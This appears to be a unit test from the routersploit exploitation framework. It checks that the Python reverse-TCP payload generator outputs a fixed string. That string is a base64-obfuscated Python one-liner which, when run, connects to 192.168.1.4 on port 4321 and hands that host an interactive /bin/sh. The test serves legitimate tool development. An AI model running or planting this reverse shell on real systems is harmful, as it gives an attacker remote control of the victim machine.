from routersploit.modules.payloads.cmd.python_reverse_tcp import Payload


# python reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "python -c \"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzE5Mi4xNjguMS40Jyw0MzIxKSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk='.decode('base64'))\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_tcp
